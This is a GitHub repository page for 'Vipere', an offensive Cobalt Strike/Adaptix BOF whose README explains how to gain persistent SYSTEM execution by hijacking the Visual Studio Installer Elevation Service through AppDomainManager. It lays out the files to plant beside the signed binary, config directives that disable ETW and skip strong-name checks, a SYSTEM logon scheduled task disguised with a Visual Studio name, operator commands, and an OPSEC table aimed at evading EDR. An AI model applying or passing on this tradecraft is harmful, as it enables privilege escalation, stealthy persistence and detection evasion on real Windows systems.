# https://github.com/0xaled/Vipere

[Skip to content](https://github.com/0xaled/Vipere#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/0xaled/Vipere) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/0xaled/Vipere) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/0xaled/Vipere) to refresh your session.Dismiss alert

{{ message }}

[0xaled](https://github.com/0xaled)/ **[Vipere](https://github.com/0xaled/Vipere)** Public

- [Notifications](https://github.com/login?return_to=%2F0xaled%2FVipere) You must be signed in to change notification settings
- [Fork\\
6](https://github.com/login?return_to=%2F0xaled%2FVipere)
- [Star\\
55](https://github.com/login?return_to=%2F0xaled%2FVipere)


main

[**1** Branch](https://github.com/0xaled/Vipere/branches) [**0** Tags](https://github.com/0xaled/Vipere/tags)

[Go to Branches page](https://github.com/0xaled/Vipere/branches)[Go to Tags page](https://github.com/0xaled/Vipere/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![0xaled](https://avatars.githubusercontent.com/u/203428592?v=4&size=40)](https://github.com/0xaled)[0xaled](https://github.com/0xaled/Vipere/commits?author=0xaled)<br>[Update README.md](https://github.com/0xaled/Vipere/commit/c87301eb7ad54b07c1ca72863f362bff3a310754)<br>4 days agoAug 5, 2026<br>[c87301e](https://github.com/0xaled/Vipere/commit/c87301eb7ad54b07c1ca72863f362bff3a310754) · 4 days agoAug 5, 2026<br>## History<br>[6 Commits](https://github.com/0xaled/Vipere/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/0xaled/Vipere/commits/main/) 6 Commits |
| [src](https://github.com/0xaled/Vipere/tree/main/src "src") | [src](https://github.com/0xaled/Vipere/tree/main/src "src") | [add src](https://github.com/0xaled/Vipere/commit/cf69b7acf203bb69b195bda5edbceb0d8badddd5 "add src") | 4 days agoAug 5, 2026 |
| [.gitignore](https://github.com/0xaled/Vipere/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/0xaled/Vipere/blob/main/.gitignore ".gitignore") | [Vipere: VS Installer LPE via AppDomainManager](https://github.com/0xaled/Vipere/commit/e1b92891ba3da407d098bf0b2014411045a8ea12 "Vipere: VS Installer LPE via AppDomainManager") | 4 days agoAug 5, 2026 |
| [Demo.mp4](https://github.com/0xaled/Vipere/blob/main/Demo.mp4 "Demo.mp4") | [Demo.mp4](https://github.com/0xaled/Vipere/blob/main/Demo.mp4 "Demo.mp4") | [Vipere: VS Installer LPE via AppDomainManager](https://github.com/0xaled/Vipere/commit/e1b92891ba3da407d098bf0b2014411045a8ea12 "Vipere: VS Installer LPE via AppDomainManager") | 4 days agoAug 5, 2026 |
| [Makefile](https://github.com/0xaled/Vipere/blob/main/Makefile "Makefile") | [Makefile](https://github.com/0xaled/Vipere/blob/main/Makefile "Makefile") | [Vipere: VS Installer LPE via AppDomainManager](https://github.com/0xaled/Vipere/commit/e1b92891ba3da407d098bf0b2014411045a8ea12 "Vipere: VS Installer LPE via AppDomainManager") | 4 days agoAug 5, 2026 |
| [README.md](https://github.com/0xaled/Vipere/blob/main/README.md "README.md") | [README.md](https://github.com/0xaled/Vipere/blob/main/README.md "README.md") | [Update README.md](https://github.com/0xaled/Vipere/commit/c87301eb7ad54b07c1ca72863f362bff3a310754 "Update README.md") | 4 days agoAug 5, 2026 |
| [vipere.axs](https://github.com/0xaled/Vipere/blob/main/vipere.axs "vipere.axs") | [vipere.axs](https://github.com/0xaled/Vipere/blob/main/vipere.axs "vipere.axs") | [Vipere: VS Installer LPE via AppDomainManager](https://github.com/0xaled/Vipere/commit/e1b92891ba3da407d098bf0b2014411045a8ea12 "Vipere: VS Installer LPE via AppDomainManager") | 4 days agoAug 5, 2026 |
| [vipere.cna](https://github.com/0xaled/Vipere/blob/main/vipere.cna "vipere.cna") | [vipere.cna](https://github.com/0xaled/Vipere/blob/main/vipere.cna "vipere.cna") | [Vipere: VS Installer LPE via AppDomainManager](https://github.com/0xaled/Vipere/commit/e1b92891ba3da407d098bf0b2014411045a8ea12 "Vipere: VS Installer LPE via AppDomainManager") | 4 days agoAug 5, 2026 |
| View all files |

## Repository files navigation

# Vipere

[Permalink: Vipere](https://github.com/0xaled/Vipere#vipere)

special thanks to [Sans23](https://github.com/requin-citron)

## Demo

[Permalink: Demo](https://github.com/0xaled/Vipere#demo)

Demo.mp4

## What is this?

[Permalink: What is this?](https://github.com/0xaled/Vipere#what-is-this)

Vipere exploits a chain of three weaknesses in the Visual Studio Installer Elevation Service to achieve **persistent SYSTEM execution** triggered by any standard user.

| Weakness | Detail |
| --- | --- |
| **Permissive SDDL** | `SERVICE_START` granted to all Authenticated Users (`AU`) |
| **No config integrity check** | .NET CLR loads `appDomainManagerAssembly` without signature verification |
| **Orphaned service registration** | Service entry persists in HKLM after VS uninstallation |

No single weakness is a vulnerability on its own, the **combination** creates a reliable LPE + persistence chain.

## How It Works

[Permalink: How It Works](https://github.com/0xaled/Vipere#how-it-works)

Render

RUNTIME - Hijack Chain

3\. PERSIST

2\. EXPLOIT

1\. PREPARE

service exists

re-triggers

same chain

BOF: vipere-full

Admin required

Download vs\_BuildTools.exe

from aka.ms

Backup original .config

Copy vs\_installershell.exe

to ProgramData

Run --quiet --wait

registers service

VSInstallerElevationService

registered in SCM

Merge .config

ETW off + AppDomainManager

Compile ADM via csc.exe

on target

Drop beacon DLL

StartServiceW

Deploy ADM chain

.config + DLL + beacon

schtasks /create

/sc onlogon /ru SYSTEM

SCM starts signed EXE

VSInstallerElevationService.exe

CLR reads merged .config

ETW disabled natively

Strong name bypass

AppDomainManager

InitializeNewDomain()

LoadLibrary beacon.dll

new thread

StartServiceCtrlDispatcherW

SERVICE\_RUNNING

SYSTEM SHELL

In-process, no child PID

Any authenticated user

sc start ...

Reboot / Logon

Scheduled task fires

Loading

```
flowchart TD
    BOF["BOF: vipere-full\nAdmin required"]:::blue

    BOF --> P1
    BOF --> E1
    BOF --> S1

    subgraph prep ["1. PREPARE"]
        P1["Download vs_BuildTools.exe\nfrom aka.ms"]
        P2["Run --quiet --wait\nregisters service"]
        P3["VSInstallerElevationService\nregistered in SCM"]:::green
        P1 --> P2 --> P3
    end

    subgraph exploit ["2. EXPLOIT"]
        E1["Backup original .config"]
        E2["Merge .config\nETW off + AppDomainManager"]:::yellow
        E3["Compile ADM via csc.exe\non target"]:::yellow
        E4["Drop beacon DLL"]:::red
        E5["StartServiceW"]:::blue
        E1 --> E2 --> E3 --> E4 --> E5
    end

    subgraph persist ["3. PERSIST"]
        S1["Copy vs_installershell.exe\nto ProgramData"]
        S2["Deploy ADM chain\n.config + DLL + beacon"]:::yellow
        S3["schtasks /create\n/sc onlogon /ru SYSTEM"]:::purple
        S1 --> S2 --> S3
    end

    P3 -.->|"service exists"| E1
    E5 ==> R1

    subgraph runtime ["RUNTIME - Hijack Chain"]
        R1["SCM starts signed EXE\nVSInstallerElevationService.exe"]:::green
        R2["CLR reads merged .config"]:::yellow
        R3["ETW disabled natively\nStrong name bypass"]:::yellow
        R4["AppDomainManager\nInitializeNewDomain()"]:::yellow
        R5["LoadLibrary beacon.dll\nnew thread"]:::red
        R6["StartServiceCtrlDispatcherW\nSERVICE_RUNNING"]:::green
        R1 --> R2 --> R3 --> R4
        R4 --> R5
        R4 --> R6
    end

    R5 --> RESULT["SYSTEM SHELL\nIn-process, no child PID"]:::red
    R6 --> RESULT

    TRIG["Any authenticated user\nsc start ..."]:::purple -.->|"re-triggers"| R1
    S3 -.-> REBOOT["Reboot / Logon\nScheduled task fires"]:::purple
    REBOOT -.->|"same chain"| R4

    classDef blue fill:#dae8fc,stroke:#6c8ebf,color:#000
    classDef green fill:#d5e8d4,stroke:#82b366,color:#000
    classDef yellow fill:#fff2cc,stroke:#d6b656,color:#000
    classDef red fill:#f8cecc,stroke:#b85450,color:#000
    classDef purple fill:#e1d5e7,stroke:#9673a6,color:#000
```

### AppDomainManager Hijacking + ETW Evasion

[Permalink: AppDomainManager Hijacking + ETW Evasion](https://github.com/0xaled/Vipere#appdomainmanager-hijacking--etw-evasion)

The signed Microsoft binary is **never replaced**. Three small files are added alongside:

```
C:\Program Files (x86)\Microsoft Visual Studio\Installer\
  VSInstallerElevationService.exe               -- UNTOUCHED (Microsoft signed)
  VSInstallerElevationService.exe.config        -- INJECTED (.config with ETW kill)
  Microsoft.VS.ConfigurationManager.dll         -- AppDomainManager (compiled on-target via csc.exe)
  Microsoft.VS.ConfigurationHost.dll            -- your beacon DLL
```

The `.config` is **merged** into the original - all 22+ binding redirects are preserved. If no original exists, a standalone config is used instead.

On service start, the .NET CLR reads the config which:

1. **Disables ETW** natively (`<etwEnable enabled="false"/>`) \- EDR is blind
2. **Bypasses strong name checks** (`<bypassTrustedAppStrongNames enabled="true"/>`)
3. **Loads the AppDomainManager** which calls `LoadLibrary` on your beacon DLL

The AppDomainManager also **takes over SCM registration** \- it calls `StartServiceCtrlDispatcherW` and reports `SERVICE_RUNNING`, so the service stays alive indefinitely. No child process, no parent-child relationship visible to EDR.

```
Service process (SYSTEM)
  \_ CLR init -> AppDomainManager.InitializeNewDomain()
       |_ Thread: LoadLibrary("beacon.dll") -> beacon runs in-process
       \_ StartServiceCtrlDispatcherW -> SCM sees SERVICE_RUNNING
            \_ process stays alive until sc stop
```

### Persistence via Scheduled Task

[Permalink: Persistence via Scheduled Task](https://github.com/0xaled/Vipere#persistence-via-scheduled-task)

`persist` creates a second AppDomainManager chain in a separate directory using a different .NET binary:

```
C:\ProgramData\Microsoft\VisualStudio\Updates\
  vs_installershell.exe                         -- copy of legit .NET binary
  vs_installershell.exe.config                  -- AppDomainManager + ETW kill
  Microsoft.VS.ConfigurationManager.dll         -- compiled on-target
  Microsoft.VS.ConfigurationHost.dll            -- your beacon DLL
```

A scheduled task (`Microsoft\VisualStudio\UpdateCheckService`) runs the binary as SYSTEM at every logon.

### Bootstrap Mode (virgin machine)

[Permalink: Bootstrap Mode (virgin machine)](https://github.com/0xaled/Vipere#bootstrap-mode-virgin-machine)

Downloads the official `vs_BuildTools.exe` from `https://aka.ms/vs/17/release/vs_BuildTools.exe`, runs it silently to register the service, then uses AppDomainManager hijacking. All traffic goes to `microsoft.com` over HTTPS via WinHTTP.

## Usage

[Permalink: Usage](https://github.com/0xaled/Vipere#usage)

### CobaltStrike

[Permalink: CobaltStrike](https://github.com/0xaled/Vipere#cobaltstrike)

Load `vipere.cna` in the Script Manager. Commands are available as beacon aliases:

```
vipere-check
vipere-full /path/to/beacon.dll
vipere-cleanup
```

### Adaptix

[Permalink: Adaptix](https://github.com/0xaled/Vipere#adaptix)

Load `vipere.axs` as an extension. Commands register under the `vipere` group:

```
vipere-check
vipere-full <beacon.dll>
vipere-cleanup
```

### Generic COFF Loader

[Permalink: Generic COFF Loader](https://github.com/0xaled/Vipere#generic-coff-loader)

Load `dist/lpe_vs_bootstrap.x64.o` and pass a zero-terminated string (command) + optional binary blob (DLL bytes):

| Arg | Format | Description |
| --- | --- | --- |
| 1 | `z` (string) | Command: `check`, `prepare`, `exploit`, `persist`, `full`, `cleanup` |
| 2 | `b` (binary) | Beacon DLL bytes (required for `exploit`, `persist`, `full`) |

Payload is any beacon DLL that supports `LoadLibrary` loading (DllMain entry point).

### Commands

[Permalink: Commands](https://github.com/0xaled/Vipere#commands)

| Command | Action |
| --- | --- |
| `check` | Detect service state + persistence artifacts |
| `prepare` | Download VS Installer from microsoft.com (creates service) |
| `exploit <dll>` | AppDomainManager hijack on service -> SYSTEM |
| `persist <dll>` | Copy vs\_installershell.exe + AppDomainManager + Scheduled Task |
| `full <dll>` | prepare + exploit + persist (one-shot) |
| `cleanup` | Stop service, kill persist process, remove all artifacts, restore original .config |

## Output Examples

[Permalink: Output Examples](https://github.com/0xaled/Vipere#output-examples)

**Full (service already exists):**

```
[*] Vipere PREPARE
[+] Service already exists — skipping download
[*] Vipere EXPLOIT
[+] Service RUNNING — beacon loaded as SYSTEM
[*] Vipere PERSIST
[+] Scheduled task created (triggers at logon)
```

**Check (after exploit + persist):**

```
[*] Vipere CHECK
[+] Service registered
    Binary: YES
    .config hijack: YES
    AppDomainManager: YES
    Beacon DLL: YES
    Config backup: YES
[*] Persistence:
    Persist dir: YES
    Persist EXE: YES
    Persist beacon: YES
```

**Cleanup:**

```
[*] Vipere CLEANUP
[+] Original .config restored
[+] Scheduled task + persist dir removed
[+] Cleaned
```

## Persistence

[Permalink: Persistence](https://github.com/0xaled/Vipere#persistence)

| Mechanism | Trigger | Survives |
| --- | --- | --- |
| **SCM registration** | AppDomainManager registers as service -> process stays alive | Runs until `sc stop` |
| **Scheduled task** | Logon -> `vs_installershell.exe` as SYSTEM | Reboots, VS uninstallation |

Any authenticated user can re-trigger the service beacon:

```
sc start VSInstallerElevationService
```

## Requirements

[Permalink: Requirements](https://github.com/0xaled/Vipere#requirements)

| Phase | Privilege | Internet | VS Required |
| --- | :-: | :-: | :-: |
| prepare | Admin | Yes | No |
| exploit | Admin | No | Service must exist |
| persist | Admin | No | vs\_installershell.exe must exist |
| **trigger** | **Any user** | **No** | **Service must exist** |
| cleanup | Admin | No | No |

## OPSEC Considerations

[Permalink: OPSEC Considerations](https://github.com/0xaled/Vipere#opsec-considerations)

| Aspect | Detail |
| --- | --- |
| **Binary replacement** | None - signed binary is untouched |
| **ETW** | Killed natively via .config - no patching, no unhooking |
| **File names** | `Microsoft.VS.ConfigurationHost.dll` / `ConfigurationManager.dll` \- credible VS names |
| **Compilation** | AppDomainManager compiled on-target via `csc.exe` \- no unsigned DLL transferred |
| **Child processes** | None - beacon loaded via `LoadLibrary` in-process |
| **Network traffic** | `aka.ms` / `download.visualstudio.microsoft.com` \- legitimate Microsoft domains |
| **Bootstrapper** | `vs_BuildTools.exe` is Authenticode-signed by Microsoft |
| **SCM registration** | AppDomainManager registers as the service via `StartServiceCtrlDispatcherW` \- SCM sees a normal service lifecycle |
| **Config merge** | Injects directives into original `.config` preserving all binding redirects - diff is minimal |
| **Service creation** | None - reuses existing VS Installer registration |
| **Scheduled task** | Named `Microsoft\VisualStudio\UpdateCheckService` \- blends with legitimate VS tasks |
| **Cleanup** | Restores original .config from backup, kills persist process, removes all artifacts |

## Build

[Permalink: Build](https://github.com/0xaled/Vipere#build)

```
make
```

**Requires:**`x86_64-w64-mingw32-g++` (mingw-w64 cross-compiler)

**Project structure:**

```
vipere/
|_ vipere.cna                      # CobaltStrike aggressor script
|_ vipere.axs                      # Adaptix extension
|_ Demo.mp4                        # Demo video
|_ Makefile
|_ src/
|  |_ lpe_vs_bootstrap_bof.cpp     # BOF source
|  \_ beacon.h
\_ dist/
   \_ lpe_vs_bootstrap.x64.o       # compiled BOF
```

## Tested On

[Permalink: Tested On](https://github.com/0xaled/Vipere#tested-on)

- Windows 11 25H2 Build 26200 (July 2026: fully patched)
- Visual Studio 2022 Build Tools 17.x
- Windows Defender (current definitions)

## Related Work

[Permalink: Related Work](https://github.com/0xaled/Vipere#related-work)

- [Unit42: Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/) (AppDomainManager hijacking by Iranian APT - ETW evasion technique)
- [CYFIRMA: Operation PhantomCLR](https://www.cyfirma.com/research/phantomclr/) (Same T1574.014 technique in the wild)

## License

[Permalink: License](https://github.com/0xaled/Vipere#license)

MIT

## About

BOF exploiting the Visual Studio Installer Elevation Service for SYSTEM LPE and persistence via AppDomainManager hijacking, with native ETW evasion. For Cobalt Strike & Adaptix.

### Resources

[Readme](https://github.com/0xaled/Vipere#readme-ov-file)

[Activity](https://github.com/0xaled/Vipere/activity)

### Stars

**55** stars

### Watchers

**1** watching

### Forks

[**6** forks](https://github.com/0xaled/Vipere/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2F0xaled%2FVipere&report=0xaled+%28user%29)

## [Releases](https://github.com/0xaled/Vipere/releases)

No releases published

## [Contributors](https://github.com/0xaled/Vipere/graphs/contributors) 2 (2)

- [![@0xaled](https://avatars.githubusercontent.com/u/203428592?s=64&v=4)](https://github.com/0xaled) [**0xaled** P'tit Snake](https://github.com/0xaled)
- [![@requin-citron](https://avatars.githubusercontent.com/u/48998190?s=64&v=4)](https://github.com/requin-citron) [**requin-citron** Sans23](https://github.com/requin-citron)

## Languages

- [C++67.8%](https://github.com/0xaled/Vipere/search?l=c%2B%2B)
- [C25.7%](https://github.com/0xaled/Vipere/search?l=c)
- [NetLinx5.7%](https://github.com/0xaled/Vipere/search?l=netlinx)
- [Makefile0.8%](https://github.com/0xaled/Vipere/search?l=makefile)

You can’t perform that action at this time.